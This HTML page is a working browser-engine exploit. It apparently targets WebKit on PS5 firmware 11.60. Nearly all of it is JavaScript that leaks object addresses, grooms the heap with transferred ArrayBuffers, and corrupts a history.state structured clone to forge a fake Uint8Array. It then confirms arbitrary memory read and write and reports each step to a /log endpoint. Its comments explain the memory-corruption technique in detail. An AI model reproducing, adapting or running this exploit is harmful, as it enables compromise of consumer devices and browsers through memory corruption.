<!doctype html>
<!--
  PS5 FW 11.60 / WebKit 616.1 genuine-view R/W bootstrap.

  A six-inline-property JSFinalObject supplies exactly 0x30 controlled bytes at
  addrof(host)+0x10.  The fake header uses the VM-bootstrap String StructureID
  0x4250 (third Structure allocated by VM::VM) with Uint8Array's inline type.
  q1 is zero, so concurrent GC dispatch through the String visitor is inert.
  q2 is a genuine Uint8Array over an explicit ArrayBuffer. The fake first reads
  that cell, then upgrades its own header to the genuine Uint8Array StructureID.

  The fake byte-writes only the genuine view's m_vector. The genuine view reads a
  second Uint8Array cell, follows its backing pointer, changes A5 -> 5A -> A5,
  and is restored to its original backing before the fake value is released.
  Both genuine views use WastefulTypedArray mode 0x58, whose GC visitor retains
  the ArrayBuffer through the butterfly and never marks m_vector.

  This permits at most ten ordinary refresh attempts because allocator misses
  return a clean deserialization TypeError. A confirmed pass blocks later runs.
-->
<meta charset="utf-8"><title>genuine-u8-rw-1160</title>
<body style="font:13px monospace"><pre id="out"></pre>
<script>
"use strict";

var Q = new URLSearchParams(location.search);
var requestedDrain = parseInt(Q.get("n") || "512", 10);
var DRAIN_COUNT = isFinite(requestedDrain)
    ? Math.max(64, Math.min(1024, requestedDrain)) : 512;

var REVISION = "genuine-u8-rw-3";
var MAX_ATTEMPTS = 10;
var attemptNumber = 0;
var K = 2;
var DUPLICATE_INDEX = 2;
var CONTROL_INDEX = 0xffff;
var CONTROL_INT = -64000;
var FILLER_BIGINTS = K - 1;
var FILLER_OBJECTS = 0xfffe - K;
var EXPECTED_LENGTH = 0x50001;
var CELL_BYTES = 0x30;

var CARRIER_SLOTS = 9000000;
var CARRIER_BYTES = CARRIER_SLOTS * 8;
var CAPTURE_DELAY_MS = 3000;
var COMPOSE_DELAY_MS = 6500;
var symbolToString = Symbol.prototype.toString;

var DRAIN_SIZE = 0x10000;
var SLAB_SIZE = 0x400000;
var BUTTERFLY_HOLE_SIZE = 0x81000;
var SEPARATOR_SIZE = 0x10000;
var EARLY_HOLE_SIZE = 0x70000;
var GUARD_SIZE = 0x90000;
var PREDECESSOR_SIZE = 0x80000;
var FINAL_HOLE_SIZE = 0x80000;

var seq = 0;
var referenceTarget = null;
var rwBuffer = null;
var rwView = null;
var rwMirror = null;
var targetBuffer = null;
var targetView = null;
var fakeHost = null;
var lengthWord = null;
var fillerGraph = null;
var outerGraph = null;

// Keep all addrof allocations rooted. Releasing the 72 MB butterfly before the
// clone getter would perturb the classic-bmalloc layout inherited from /r.
var leakedScope = null;
var getterCarrier = null;
var preparedSymbolObject = null;
var capturedString = null;
var capturedWords = null;
var copiedLength = 0;
var captureState = 0;
var captureError = null;
var hostAddress = NaN;
var fakeAddress = NaN;

var keepAlive = new Array(DRAIN_COUNT + 3);
var keepIndex = 0;
var predecessorWords = null;
var pointerLow = 0;
var pointerHigh = 0;
var targetAddress = NaN;
var targetAddressLow = 0;
var targetAddressHigh = 0;

var rwHeader = new Uint8Array(CELL_BYTES);
var targetHeader = new Uint8Array(CELL_BYTES);
var scratchBits = new ArrayBuffer(8);
var scratchBytes = new Uint8Array(scratchBits);
var scratchWords = new Uint32Array(scratchBits);
var scratchDouble = new Float64Array(scratchBits);

var rwOriginalVector = NaN;
var targetVector = NaN;
var rwHeaderOK = false;
var targetHeaderOK = false;
var readObserved = false;
var writeObserved = false;
var restoreObserved = false;
var retrySafe = false;

var compositionState = 0; // 1=R/W completed, 2=normal miss, 3=header mismatch, -1=throw
var compositionLength = 0;
var compositionError = null;

function mark(tag, extra) {
    seq++;
    var line = seq + "-rw-" + tag
        + (extra !== undefined ? "-" + extra : "");
    try {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/log/" + encodeURIComponent(line), false);
        xhr.send();
    } catch (_) {}
    try { document.getElementById("out").textContent += line + "\n"; } catch (_) {}
}

function hex(value) {
    return "0x" + value.toString(16);
}

function buffer(size) {
    return new ArrayBuffer(size);
}

function leakScopeObject() {
    class Leaker { leak() { return super.foo; } }
    Leaker.prototype.__proto__ = new Proxy({}, {
        get: function (target, property, receiver) { return receiver; }
    });
    var leak = Leaker.prototype.leak;
    return (function () { return leak(); })();
}

function prepareSymbolWrapper(F) {
    leakedScope = leakScopeObject();
    if (leakedScope === undefined || leakedScope === null)
        throw new Error("scope-not-leaked");

    for (var i = 0; i < 512; i++)
        leakedScope["p" + i] = i;
    for (var j = 0; j < 8; j++)
        leakedScope[j] = 1.1 * j;

    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
    return Object(leakedScope.g);
}

function pointerFromWords(words, offset) {
    if (words[offset + 3] !== 0)
        return NaN;
    return words[offset]
        + words[offset + 1] * 0x10000
        + words[offset + 2] * 0x100000000;
}

function plausibleCell(value) {
    return value > 0x100000000
        && value <= 0xffffffffffff
        && value <= 9007199254740991
        && Math.floor(value) === value
        && value % 8 === 0;
}

function encodedHeaderNumber() {
    // Desired stored JSValue qword: 0x0108280000004250.
    // JSVALUE64 stores a finite double by adding DoubleEncodeOffset (1<<49),
    // hence the IEEE input qword is 0x0106280000004250.
    var raw = new ArrayBuffer(8);
    var u32 = new Uint32Array(raw);
    var f64 = new Float64Array(raw);
    u32[0] = 0x00004250;
    u32[1] = 0x01062800;
    return f64[0];
}

function buildFakeHost() {
    // Explicit ArrayBuffers force WastefulTypedArray mode (0x58). Its GC
    // visitor retains the backing through the butterfly and ignores m_vector,
    // which makes a short, reversible vector rewrite safe to validate.
    rwBuffer = new ArrayBuffer(0x100);
    rwView = new Uint8Array(rwBuffer);
    rwMirror = new Uint8Array(rwBuffer);
    rwMirror[0] = 0x3c;

    targetBuffer = new ArrayBuffer(0x20);
    targetView = new Uint8Array(targetBuffer);
    targetView[0] = 0xa5;
    lengthWord = { keep: 0x51515151 };

    // Object-literal creation is important: six declared properties get the six
    // inline slots. Adding six properties dynamically to {} may spill after two.
    fakeHost = {
        q0: encodedHeaderNumber(),
        q1: 1.1,
        q2: rwView,
        q3: lengthWord,
        q4: 2.2,
        q5: 3.3
    };

    // Deleted inline properties become exact all-zero qwords.
    delete fakeHost.q1; // fake butterfly
    delete fakeHost.q4; // fake byteOffset
    delete fakeHost.q5; // mode 0: non-resizable/raw-fields path; inert GC switch

    if (!isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
        || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
        || targetView[0] !== 0xa5)
        throw new Error("fake-host-shape-failed");
}

function buildAndStoreGraph() {
    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
    buildFakeHost();

    mark("SSV-BUILD", "k=" + K + "-n=" + DRAIN_COUNT);
    fillerGraph = new Array(0xfffd);
    var pos = 0;
    var huge = 1n << 40n;
    for (var b = 0; b < FILLER_BIGINTS; ++b)
        fillerGraph[pos++] = huge + BigInt(b);
    for (var o = 0; o < FILLER_OBJECTS; ++o)
        fillerGraph[pos++] = {};

    outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = referenceTarget;
    outerGraph[2] = referenceTarget;
    outerGraph[CONTROL_INDEX] = CONTROL_INT;
    mark("SSV-BUILT", "duplicate-index=" + DUPLICATE_INDEX);

    mark("SSV-STORE-ENTER", "writer-ref=0x" + (0x10000 - K).toString(16));
    history.replaceState(outerGraph, "");
    mark("SSV-STORED", "fake-host-rw-target-not-serialized");
}

function prepareAddrof() {
    capturedWords = new Uint16Array(16);
    getterCarrier = function getterCarrierFunction() { return 7; };

    mark("ADDROF-PREP-BEGIN", "slots=" + CARRIER_SLOTS + "-bytes=" + CARRIER_BYTES);
    getterCarrier[0] = fakeHost;
    for (var i = 1; i < CARRIER_SLOTS; i++)
        getterCarrier[i] = 0;
    getterCarrier[1] = targetView;
    getterCarrier[2] = fakeHost;
    getterCarrier[3] = targetView;
    mark("ADDROF-CARRIER-DONE", "host-target-host-target");

    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
    mark("ADDROF-WRAPPER-READY", "wait=" + CAPTURE_DELAY_MS + "ms");

    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
    setTimeout(beginComposition, COMPOSE_DELAY_MS);
}

function runAddrofCapture() {
    try {
        capturedString = symbolToString.call(preparedSymbolObject);
        copiedLength = capturedString.length;
        for (var i = 0; i < 16; i++)
            capturedWords[i] = capturedString.charCodeAt(7 + i);
        captureState = 1;
    } catch (error) {
        captureError = error;
        captureState = -1;
    }
}

function fillRawCellPointers(backing, pointer) {
    pointerHigh = Math.floor(pointer / 0x100000000);
    pointerLow = pointer - pointerHigh * 0x100000000;

    if (!plausibleCell(pointer)
        || pointerHigh < 0 || pointerHigh > 0xffff
        || Math.floor(pointerLow) !== pointerLow
        || pointerLow < 0 || pointerLow > 0xffffffff
        || pointerLow + pointerHigh * 0x100000000 !== pointer)
        throw new Error("invalid-low48-fake-address");

    predecessorWords = new Uint32Array(backing);
    for (var i = 0; i < predecessorWords.length; i += 2) {
        predecessorWords[i] = pointerLow;
        predecessorWords[i + 1] = pointerHigh;
    }

    var last = predecessorWords.length - 2;
    if (predecessorWords[0] !== pointerLow
        || predecessorWords[1] !== pointerHigh
        || predecessorWords[last] !== pointerLow
        || predecessorWords[last + 1] !== pointerHigh)
        throw new Error("pointer-fill-verification-failed");
}

function clearPredecessor() {
    if (predecessorWords !== null)
        predecessorWords.fill(0);
}

function loadHistoryCritical() {
    var result = null;
    var candidate = null;
    var rwHeaderCaptured = false;
    var rwVectorTouched = false;
    try {
        result = history.state;
        compositionLength = result.length;

        if (compositionLength !== EXPECTED_LENGTH) {
            result[DUPLICATE_INDEX] = undefined;
            result = null;
            clearPredecessor();
            retrySafe = true;
            compositionState = 3;
            return;
        }

        // In the ordinary clone, slots 1 and 2 are the same decoded object.
        // Strict equality compares their raw cell values without dereferencing a
        // suspect slot-2 pointer. The desync replaces only slot 2.
        if (result[1] === result[DUPLICATE_INDEX]) {
            result[DUPLICATE_INDEX] = undefined;
            candidate = null;
            result = null;
            clearPredecessor();
            retrySafe = true;
            compositionState = 2;
            return;
        }

        candidate = result[DUPLICATE_INDEX];
        result[DUPLICATE_INDEX] = undefined;
        result = null;

        // From here until candidate=null: indexed scalar operations only. There
        // is no logging, formatting, allocation, yield, or user callback.
        for (var i = 0; i < CELL_BYTES; ++i)
            rwHeader[i] = candidate[i];
        rwHeaderCaptured = true;

        var rwSID = rwHeader[0]
            + rwHeader[1] * 0x100
            + rwHeader[2] * 0x10000
            + rwHeader[3] * 0x1000000;
        var rwHeaderHigh = rwHeader[4]
            + rwHeader[5] * 0x100
            + rwHeader[6] * 0x10000
            + rwHeader[7] * 0x1000000;
        var rwButterfly = rwHeader[8]
            + rwHeader[9] * 0x100
            + rwHeader[10] * 0x10000
            + rwHeader[11] * 0x1000000
            + rwHeader[12] * 0x100000000
            + rwHeader[13] * 0x10000000000;
        var rwVectorLow = rwHeader[0x10]
            + rwHeader[0x11] * 0x100
            + rwHeader[0x12] * 0x10000
            + rwHeader[0x13] * 0x1000000;
        var rwVectorHigh = rwHeader[0x14] + rwHeader[0x15] * 0x100;
        rwOriginalVector = rwVectorLow + rwVectorHigh * 0x100000000;

        var rwOffsetZero = true;
        for (var rz = 0x20; rz < 0x28; ++rz) {
            if (rwHeader[rz] !== 0)
                rwOffsetZero = false;
        }
        // m_mode is one byte at +0x28. Bytes +0x29..+0x2f are C++ tail
        // padding and are intentionally not validated.
        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
            && (rwSID & 0xf) === 0
            && rwHeader[4] === 0 && rwHeader[5] === 0x28
            && rwHeader[6] === 0x08
            && (rwHeader[7] === 0 || rwHeader[7] === 1)
            && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
            && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
            && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
            && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
            && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
            && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
            && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
            && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
            && rwOffsetZero && rwHeader[0x28] === 0x58;

        if (!rwHeaderOK) {
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        // Replace the bootstrap String StructureID with this VM's genuine
        // Uint8Array header. Boxed doubles add 1<<49, or 0x20000 in high32.
        scratchWords[0] = rwSID;
        scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
        var upgradedHeader = scratchDouble[0];
        var upgradedFinite = upgradedHeader === upgradedHeader
            && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
        if (!upgradedFinite) {
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }
        fakeHost.q0 = upgradedHeader;
        if (fakeHost.q0 !== upgradedHeader) {
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        // Point the genuine Wasteful carrier at the leaked target cell.
        scratchWords[0] = targetAddressLow;
        scratchWords[1] = targetAddressHigh;
        rwVectorTouched = true;
        for (var w1 = 0; w1 < 8; ++w1)
            candidate[0x10 + w1] = scratchBytes[w1];

        // Read and validate the target cell before following its vector.
        for (var j = 0; j < CELL_BYTES; ++j)
            targetHeader[j] = rwView[j];

        var targetSID = targetHeader[0]
            + targetHeader[1] * 0x100
            + targetHeader[2] * 0x10000
            + targetHeader[3] * 0x1000000;
        var targetButterfly = targetHeader[8]
            + targetHeader[9] * 0x100
            + targetHeader[10] * 0x10000
            + targetHeader[11] * 0x1000000
            + targetHeader[12] * 0x100000000
            + targetHeader[13] * 0x10000000000;
        var targetVectorLow = targetHeader[0x10]
            + targetHeader[0x11] * 0x100
            + targetHeader[0x12] * 0x10000
            + targetHeader[0x13] * 0x1000000;
        var targetVectorHigh = targetHeader[0x14] + targetHeader[0x15] * 0x100;
        targetVector = targetVectorLow + targetVectorHigh * 0x100000000;

        var targetOffsetZero = true;
        for (var tz = 0x20; tz < 0x28; ++tz) {
            if (targetHeader[tz] !== 0)
                targetOffsetZero = false;
        }
        // As above, only the one-byte mode field is semantic; ignore padding.
        targetHeaderOK = targetSID === rwSID
            && targetHeader[4] === 0 && targetHeader[5] === 0x28
            && targetHeader[6] === 0x08
            && (targetHeader[7] === 0 || targetHeader[7] === 1)
            && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
            && targetButterfly > 0x100000000 && targetButterfly % 8 === 0
            && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
            && targetVector > 0x100000000 && targetVector % 8 === 0
            && targetHeader[0x18] === 0x20
            && targetHeader[0x19] === 0 && targetHeader[0x1a] === 0
            && targetHeader[0x1b] === 0 && targetHeader[0x1c] === 0
            && targetHeader[0x1d] === 0 && targetHeader[0x1e] === 0
            && targetHeader[0x1f] === 0 && targetOffsetZero
            && targetHeader[0x28] === 0x58;

        if (!targetHeaderOK) {
            for (var r1 = 0; r1 < 8; ++r1)
                candidate[0x10 + r1] = rwHeader[0x10 + r1];
            rwVectorTouched = false;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        // Retarget the genuine carrier to the target's owned backing bytes.
        scratchWords[0] = targetVectorLow;
        scratchWords[1] = targetVectorHigh;
        for (var w2 = 0; w2 < 8; ++w2)
            candidate[0x10 + w2] = scratchBytes[w2];

        readObserved = rwView[0] === 0xa5 && targetView[0] === 0xa5;
        if (!readObserved) {
            for (var rRead = 0; rRead < 8; ++rRead)
                candidate[0x10 + rRead] = rwHeader[0x10 + rRead];
            rwVectorTouched = false;
            targetView[0] = 0xa5;
            rwMirror[0] = 0x3c;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }
        rwView[0] = 0x5a;
        writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
        rwView[0] = 0xa5;

        // Restore the carrier before dropping the only forged JSValue.
        for (var r2 = 0; r2 < 8; ++r2)
            candidate[0x10 + r2] = rwHeader[0x10 + r2];
        rwVectorTouched = false;
        targetView[0] = 0xa5;
        rwMirror[0] = 0x3c;
        restoreObserved = rwView[0] === 0x3c
            && rwMirror[0] === 0x3c && targetView[0] === 0xa5;

        candidate = null;
        clearPredecessor();
        compositionState = 1;
    } catch (error) {
        // Only a throw before any candidate was loaded is refresh-safe. Once a
        // forged value returned, require a new revision/manual review even if
        // the restoration path completed.
        retrySafe = candidate === null && result === null
            && !rwHeaderCaptured && error && error.name === "TypeError";
        if (result !== null) {
            try { result[DUPLICATE_INDEX] = undefined; } catch (_) {}
        }
        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
            try {
                for (var rr = 0; rr < 8; ++rr)
                    candidate[0x10 + rr] = rwHeader[0x10 + rr];
            } catch (_) {}
        }
        candidate = null;
        result = null;
        try { targetView[0] = 0xa5; } catch (_) {}
        try { rwMirror[0] = 0x3c; } catch (_) {}
        try { clearPredecessor(); } catch (_) {}
        compositionError = error;
        compositionState = -1;
    }
}

function allZero(bytes, start, end) {
    for (var i = start; i < end; ++i) {
        if (bytes[i] !== 0)
            return false;
    }
    return true;
}

function uint32At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000;
}

function low48At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000
        + bytes[offset + 4] * 0x100000000
        + bytes[offset + 5] * 0x10000000000;
}

function dumpHex(bytes) {
    var out = "";
    for (var i = 0; i < CELL_BYTES; ++i)
        out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
    return out;
}

function reportComposition() {
    if (compositionState < 0) {
        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
            (compositionError && compositionError.name) + ":"
            + String(compositionError && compositionError.message).slice(0, 80));
        mark("DONE-THROW", "predecessor-cleared=true");
        if (!retrySafe) {
            try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
        }
        setTimeout(function () { mark("SURVIVED-THROW-T1000"); }, 1000);
        return;
    }

    if (compositionState === 2) {
        mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
        mark("DONE-MISS", "predecessor-cleared=true");
        setTimeout(function () { mark("SURVIVED-MISS-T1000"); }, 1000);
        return;
    }

    if (compositionState === 3) {
        mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK
            + "-carrier-restored=true");
        mark("RW-HEADER-HEX", dumpHex(rwHeader));
        mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
        if (!retrySafe) {
            try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
        }
        setTimeout(function () { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
        return;
    }

    if (compositionState === 0) {
        mark("NO-RESULT", "critical-load-did-not-finish");
        return;
    }

    mark("SSV-RETURNED-CLEARED", "length=" + compositionLength
        + "-predecessor-cleared=true");
    mark("RW-CARRIER", "sid=" + hex(uint32At(rwHeader, 0))
        + "-vector=" + hex(rwOriginalVector)
        + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
    mark("TARGET-CELL", "P=" + hex(targetAddress)
        + "-sid=" + hex(uint32At(targetHeader, 0))
        + "-vector=" + hex(targetVector)
        + "-length=0x20-mode=0x" + targetHeader[0x28].toString(16));
    mark("RW-HEADER-HEX", dumpHex(rwHeader));
    mark("TARGET-HEADER-HEX", dumpHex(targetHeader));

    var readPass = rwHeaderOK && targetHeaderOK && readObserved
        && compositionLength === EXPECTED_LENGTH;
    var writePass = writeObserved && restoreObserved;
    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
    if (readPass)
        mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
    else
        mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK
            + "-target-header=" + targetHeaderOK + "-observed=" + readObserved
            + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));

    if (writePass)
        mark("ARBITRARY-WRITE-PASS", "a5-to-5a-to-a5-restored=true");
    else
        mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved
            + "-restore=" + restoreObserved);

    if (readPass && writePass) {
        mark("GENUINE-U8-RW-PASS", "carrier-vector-restored=true");
        try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
    }

    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16)
        + "-target-byte=" + targetView[0].toString(16)
        + "-length-word=" + lengthWord.keep.toString(16));
    setTimeout(function () { mark("SURVIVED-T100"); }, 100);
    setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
    setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);
}

function runGroomAndLoad() {
    try {
        mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
        var channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (var i = 0; i < DRAIN_COUNT; ++i)
            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

        var slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        var separator = buffer(SEPARATOR_SIZE);
        var earlyHole = buffer(EARLY_HOLE_SIZE);
        var guard = buffer(GUARD_SIZE);
        var predecessor = buffer(PREDECESSOR_SIZE);
        var finalHole = buffer(FINAL_HOLE_SIZE);

        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;
        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8)
            + "-fake=" + hex(fakeAddress));

        // Preserve /r's exact synchronous free/getter sequence.
        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
            earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        try { clearPredecessor(); } catch (_) {}
        compositionError = error;
        compositionState = -1;
    }
    reportComposition();
}

function beginComposition() {
    if (captureState === 0) {
        mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
        return;
    }
    if (captureState < 0) {
        mark("ADDROF-THREW", (captureError && captureError.name) + ":"
            + String(captureError && captureError.message).slice(0, 80));
        return;
    }

    var a0 = pointerFromWords(capturedWords, 0);
    var b0 = pointerFromWords(capturedWords, 4);
    var a1 = pointerFromWords(capturedWords, 8);
    var b1 = pointerFromWords(capturedWords, 12);
    var repeated = a0 === a1 && b0 === b1;
    var distinct = a0 !== b0;
    var plausible = plausibleCell(a0) && plausibleCell(b0)
        && plausibleCell(a1) && plausibleCell(b1);
    var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

    mark("ADDROF-RETURNED", REVISION);
    mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0)
        + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));

    if (!(repeated && distinct && plausible && sourceCovered)) {
        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct
            + "-plausible=" + plausible + "-covered=" + sourceCovered);
        return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
        || Math.floor(targetAddressLow) !== targetAddressLow
        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
        return;
    }
    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
        return;
    }
    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress)
        + "-delta=0x10");
    runGroomAndLoad();
}

var allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
// This dedicated ARW-only copy is intentionally repeatable: every refresh runs
// a fresh attempt even after a prior pass, mismatch, or ten-attempt history.
allowAgain = true;
var attemptKey = REVISION + ":attempts";
var passKey = REVISION + ":passed";
var blockKey = REVISION + ":blocked";
var priorAttempts = 0;
var alreadyPassed = false;
var alreadyBlocked = false;
try {
    priorAttempts = parseInt(sessionStorage.getItem(attemptKey) || "0", 10);
    if (!isFinite(priorAttempts) || priorAttempts < 0)
        priorAttempts = 0;
    alreadyPassed = sessionStorage.getItem(passKey) === "1";
    alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
} catch (_) {}
attemptNumber = priorAttempts + 1;

mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT
    + "-attempt=" + attemptNumber + "-max=" + MAX_ATTEMPTS);

if (alreadyPassed && !allowAgain) {
    mark("PASS-ALREADY-BLOCKED", "no-more-runs-needed");
} else if (alreadyBlocked && !allowAgain) {
    mark("CANDIDATE-RETURNED-BLOCKED", "manual-review-required");
} else if (priorAttempts >= MAX_ATTEMPTS && !allowAgain) {
    mark("RETRY-LIMIT", "max=" + MAX_ATTEMPTS + "-no-more-runs");
} else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
    || typeof Symbol !== "function" || typeof history === "undefined"
    || typeof history.replaceState !== "function") {
    mark("UNSUPPORTED");
} else {
    try { sessionStorage.setItem(attemptKey, String(attemptNumber)); } catch (_) {}
    try {
        buildAndStoreGraph();
        prepareAddrof();
    } catch (error) {
        mark("SETUP-THREW", (error && error.name) + ":"
            + String(error && error.message).slice(0, 80));
    }
}
</script>
</body>
</html>
